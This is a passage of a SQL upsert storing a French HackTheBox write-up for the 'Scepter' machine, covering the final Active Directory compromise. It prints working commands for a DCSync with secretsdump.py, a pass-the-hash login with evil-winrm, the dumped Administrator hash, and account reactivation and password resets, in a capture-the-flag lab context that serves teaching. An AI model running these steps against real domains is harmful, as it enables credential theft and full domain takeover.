Le KDC valide la demande Kerberos car l''e-mail du certificat correspond à l''attribut **altSecurityIdentities** que nous avons forcé sur `p.adams`. Certipy me retourne le hash NTLM de `p.adams` et son TGT (`p.adams.ccache`).

## 5. DCSync et Compromission Totale (Root)

Avec le TGT de `p.adams`, je possède désormais les droits de réplication de l''Active Directory (protocole **MS-DRSR**). Je n''ai même pas besoin de me connecter au serveur, je lance directement un **DCSync** depuis ma machine Exegol avec `secretsdump.py`.

Bash

```
# Exécution du DCSync sans mot de passe (via hash NTLM)
secretsdump.py scepter.htb/p.adams@DC01.scepter.htb -hashes :1b925c524f447bb821a8789c4b118ce0 -no-pass
```

L''outil extrait la base NTDS.dit et dump tous les secrets du domaine, y compris les clés Kerberos et les hashes NTLM. Je récupère le graal : le hash de l''utilisateur **Administrator**.

Plaintext

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a291ead3493f9773dc615e66c2ea21c4:::
```

Il ne reste plus qu''à effectuer un **Pass-the-Hash (PtH)** pour obtenir le shell final et lire `root.txt`.

Bash

```
evil-winrm -i DC01.scepter.htb -u administrator -H a291ead3493f9773dc615e66c2ea21c4
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
```

La machine est Pwned.

---

## 6. Beyond Root : Démystification des erreurs initiales

Un bon Red Teamer ne laisse pas de zones d''ombre. Rappelle-toi de la Partie 1 : lors du cracking des certificats trouvés sur le share NFS (`o.scott`, `m.clark`, `e.lewis`), Kerberos nous retournait l''erreur `KDC_ERR_CLIENT_REVOKED`.

Maintenant que je suis `Administrator`, je peux interroger l''AD pour comprendre **pourquoi**.

PowerShell

```
# Vérification du statut de l''utilisateur m.clark
Get-ADUser m.clark
```

_Constat :_ La propriété `Enabled` est définie sur `False`. Le compte était tout simplement **désactivé**.

Que se passe-t-il si je réactive le compte ?

PowerShell

```
net user m.clark /active:yes
```

Je relance mon authentification `certipy auth` avec le certificat de `m.clark`. Nouvelle erreur : `KDC_ERR_KEY_EXPIRED (Password has expired)`.

Je force un nouveau mot de passe :

PowerShell

```
net user m.clark password123!
```

Je relance l''authentification avec le même certificat récupéré sur le share NFS, et cette fois-ci, **j''obtiens un TGT valide**.

**Conclusion technique :** Contrairement à ce que le message d''erreur `KDC_ERR_CLIENT_REVOKED` laisse supposer, le certificat PKCS#12 n''était pas révoqué au niveau de l''Autorité de Certification (pas de CRL impliquée ici).

L''authentification PKINIT (**passwordless authentication**) est profondément liée à l''état du compte Active Directory. Si le compte est désactivé ou si son mot de passe expire (même s''il n''est pas utilisé pour se connecter), le contrôleur de domaine refusera de délivrer le TGT. C''est une nuance d''infrastructure cruciale à comprendre lors de l''audit d''environnements AD CS.',
  'HackTheBox',
  'Hard',
  40,
  ARRAY['Active Directory', 'AD CS', 'ESC14', 'DCSync'],
  '**Scepter** est une machine Windows de niveau difficile (Hard) fortement axée sur l''Active Directory et l''exploitation des services de certificats (AD CS). Le chemin de compromission demande de la rig...',
  true,
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  description = EXCLUDED.description;
